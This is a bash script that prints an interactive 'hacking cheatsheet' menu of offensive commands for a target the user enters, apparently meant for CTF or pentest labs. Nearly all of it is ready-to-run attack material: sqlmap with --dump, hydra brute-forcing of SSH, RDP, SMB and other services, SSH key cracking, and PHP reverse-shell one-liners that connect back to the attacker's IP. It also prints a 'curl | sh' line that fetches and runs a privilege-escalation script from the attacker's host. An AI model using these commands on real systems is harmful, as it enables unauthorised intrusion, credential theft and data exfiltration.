#!/bin/bash
#This script is for pentesting/learning security practices.
#Contact me here: https://hackforums.net/member.php?action=profile&uid=2682887

clear
##Enter website target and it defines it as $T
read -p "Enter Target Site (IP or Website.com with no trailing forward slash): " "T"

if [ -z "$T" ]; then
  T="127.0.0.1"
fi

myip=$(ifconfig tun0 | awk '/inet / {print $2}')
if [[ "$myip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "The IP address is $myip"
else
  myip=$(curl -s ifconfig.me)
  if [[ "$myip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "The IP address is $myip"
  else
    echo "myip"
  fi
fi

clear

function menu {
  clear
  clear
  echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀"
  echo "⠀⠀⠀⠀⢀⠀⠀⠀⠊⣉⡉⠄⠀⠀⠀⠀⠀⠀⠀"
  echo "⠀⠀⠀⠠⠂⠀⣀⠠⡀⠈⠀⡀⠀⠀⠂⠄⠀⢀⠀"
  echo "⠀⠁⠉⠉⠁⠀⠀⠀⠌⠉⠙⠀⠀⠀⠐⠉⠉⠀⠃"
  echo "⠀⢇⠈⠉⠀⠂⠀⠀⠀⠉⠁⡀⠀⠀⠇⠈⠉⠀⠂"
  echo "⠈⢀⠒⠒⠊⠀⠉Welcome⠁⠐⠒⠒⠂⠂"
  echo "⠀⠆⠘⠙⠀⠀⠀⠀To the⠀⠆⠘⠛⢈⠀"
  echo "⠀⠈⠖⠒⠂ Simulation⠒⠒⠂⠄"
  echo "⠀⡆⠐⠒⠀⠄⠀⠀⠀⠒⠂⠀⠀⠀⡆⠐⠒⠀⠄"
  echo "⠐⡈⠤⠤⠔⠀⠒⠀⡢⠤⠤⠁⠒⠂⠠⠤⠤⠄⠄"
  echo "⠀⠀⠀⠈⠄⠀⠀⠐⠀⠶⠆⠡⠀⠀⠄⠂⠀⠀⠀"
  echo "⠀⠀⠀⠀⠀⠀⠀⠂⠄⠀⠀⠂⠁⠀⠀⠀⠀⠀⠀"
  echo "⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀"
  echo -e "\033[35mScript will default to Tun0 OpenVPN IP for you and add it to commands otherwise tries Public IP, then IPv4 if that fails.\033[0m"
  echo -e "\033[1mRobot's Ultra Special Hacking Cheatsheet\033[0m - \033[31mSometimes you just need a reminder of where to look next.\033[0m"
  echo -e "\033[32m(1) Port Scan Commands\033[0m"
  echo -e "\033[32m(2) Subdomain Scan Commands\033[0m"
  echo -e "\033[32m(3) CMS checking Commands\033[0m"
  echo -e "\033[32m(4) Directory checking commands\033[0m"
  echo -e "\033[32m(5) Host a local folder\033[0m"
  echo -e "\033[32m(6) Wordpress scanning\033[0m"
  echo -e "\033[32m(7) Common files to check\033[0m"
  echo -e "\033[32m(8) SQL injection\033[0m"
  echo -e "\033[32m(9) SMB tools\033[0m"
  echo -e "\033[32m(10) Hydra bruteforcing\033[0m"
  echo -e "\033[32m(11) Netcat Listener\033[0m"
  echo -e "\033[32m(12) PHP reverse shell\033[0m"
  echo -e "\033[32m(13) SSH/ID_RSA how to\033[0m"
  echo -e "\033[32m(14) FTP Stuff\033[0m"
  echo -e "\033[32m(15) DNS/Dig stuff\033[0m"
  echo -e "\033[32m(16) Privelege Escalation Commons\033[0m"
  echo -e "\033[32m(17) Helpful commands to remember\033[0m"
  echo "Enter your selection: "
  read selection
  clear
  case $selection in
    1)
      echo -e "\033[34mRustscan can be used for quick port scanning\033[0m"
      command="rustscan -g -a 127.0.0.1 | cut -f 2 -d '[' | cut -f 1 -d ']'"
      echo "$command"
      echo -e "\033[34mThen we can pipe it into nmap with the ports we found for futher information where the ports are what we found from rustscan\033[0m"
      echo "nmap -sC -sV $T -p 80,443,9090"
      ;;
    2)
      echo -e "\033[34mWe can use wfuzz to try and find subdomains if we have found a domain name or vhost such as website.com\033[0m"
      echo "wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.website.com\" http://website.com"
      ;;
    3)
      echo -e "\033[34mWe can use whatweb or httpx to check what a subdomain, subfolder or domain is hosting including version numbers\033[0m"
      echo "whatweb $T:80"
      echo "whatweb $T:80/admin"
      echo "whatweb $T"
      echo "/usr/local/bin/httpx -status-code -title -tech-detect $T -p 8080,443,80,9999" 2>&1
      ;;
    4)
      echo -e "\033[34mIf you have logged into the site, make sure to run it with cookies using --cookies= to possible find more results\033[0m"
      echo "dirsearch -u $T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie=$cookie --exclude-subdirs=js,css"
      ;;
    5)
      echo -e "\033[34mTo host a local folder make sure you are in that folder within the terminal you run this command\033[0m"
      echo "python3 -m http.server 80"
      ;;
    6)
      echo -e "\033[34mWordpress scanning is easy, if you have an API key from wpscan.com use that otherwise remove the api-token parameter\033[0m"
      echo "wpscan --url http://$T --enumerate u,vp,vt --api-token=1234567890"
      ;;
    7)
      echo -e "\033[34mJust a reminder of common folder/files to check\033[0m"
      echo "/robots.txt /crossdomain.xml /clientaccesspolicy.xml /phpinfo.php /sitemap.xml /.git"
      ;;
    8)
      echo -e "\033[34mIf you find fields that look like they might be injected with post data in the URL - also check for post data in burp\033[0m"
      echo "sqlmap -u \"https://$T/index.php?m=Index\" --level 5 --risk 3 --dump"
      ;;
    9)
      echo -e "\033[34mCommon SMB commands\033[0m"
      echo "smbclient -L //$T -U \"\""
      echo "smbmap -H $T"
      echo "showmount -e $T"
      echo "smbget -R smb://$T/anonymous"
      echo "nmblookup -A $T"
      ;;
    10)
      echo -e "\033[34mCommon hydra commands\033[0m"
      echo "hydra -l root -P passwords.txt -t 32 $T ftp"
      echo "hydra -L usernames.txt -P pass.txt $T mysql"
      echo "hydra -V -f -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://$T"
      echo "hydra -l Administrator -P words.txt $T smb -t 1"
      echo "hydra -l root -P /usr/share/wordlists/rockyou.txt $T smtp -V"
      echo "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T ssh"
      echo "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T telnet"
      echo "hydra -L /root/Desktop/usernames.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc"
      ;;
    11)
      echo -e "\033[34mNetcat is helpful\033[0m"
      echo "nc -lvnp 4444"
      ;;
    12)
      echo -e "\033[34mPHP reverse shell\033[0m"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);\`/bin/sh -i <&3 >&3 2>&3\`;'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
      ;;
    13)
      echo -e "\033[34mSSH id_rsa file?\033[0m"
      echo "chmod 400 id_rsa"
      echo "/usr/share/john/ssh2john.py id_rsa > id_rsa.john"
      echo "john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john"
      echo "ssh -i id_rsa username@$T -p 22"
      ;;
    14)
      echo -e "\033[34mFTP Stuff\033[0m"
      echo "wget -m ftp://anonymous:anonymous@$T"
      ;;
    15)
      echo -e "\033[34mDig for DNS stuff\033[0m"
      echo "dig $T"
      ;;
    16)
      echo -e "\033[34mFind SUID files\033[0m"
      echo "find / -perm -u=s -type f 2>/dev/null"
      echo ""
      echo -e "\033[34mLocate the SUID root file\033[0m"
      echo "find / -user root -perm -4000 -print"
      echo ""
      echo -e "\033[34mLocate the SGID root file\033[0m"
      echo "find / -group root -perm -2000 -print"
      echo ""
      echo -e "\033[34mLocate the SUID and SGID files:\033[0m"
      echo "find / -perm -4000 -o -perm -2000 -print"
      echo ""
      echo -e "\033[34mFind files that do not belong to any user:\033[0m"
      echo "find / -nouser -print"
      echo ""
      echo -e "\033[34mLocate a file that does not belong to any user group:\033[0m"
      echo "find / -nogroup -print"
      echo ""
      echo "curl -L $myip/linpeas.sh | sh"
      echo ""
      echo "wget $myip/linpeas.sh"
      echo ""
      echo "crontab -e"
      ;;
    17)
      echo -e "\033[34mEnumerating SNMP\033[0m"
      echo "snmpget -v 1 -c public $T"
      echo "snmpwalk -v 1 -c public $T"
      echo "snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
      echo ""
      echo -e "\033[34mHashcracking with hashcat\033[0m"
      echo "hashcat -m 400 -a 0 hash.txt /root/rockyou.txt"
      echo ""
      echo -e "\033[34mPython to bash shell\033[0m"
      echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
      echo ""
      echo -e "\033[34mFind processes running\033[0m"
      echo "ps aux"
      echo ""
      echo -e "\033[34mFinding Exif data on a file\033[0m"
      echo "exiftool file.jpg"
      echo ""
      echo -e "\033[34mCracking the password for an image file\033[0m"
      echo "stegseek file.jpg "
      echo ""
      echo -e "\033[34mCrack zip file password\033[0m"
      echo "sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip"
      ;;
    1337)
      echo "You found the secret checklist menu!"
      echo "This is still a work in progress. Stay tuned."
      ;;
    *)
      echo -e "\033[31mInvalid option. Please try again.\033[0m"
      ;;
  esac
}

while true; do
  menu
  echo ""
  read -p "Press enter to return to the menu or type 'exit' to quit: " input
  if [ "$input" == "exit" ]; then
    break
  fi
done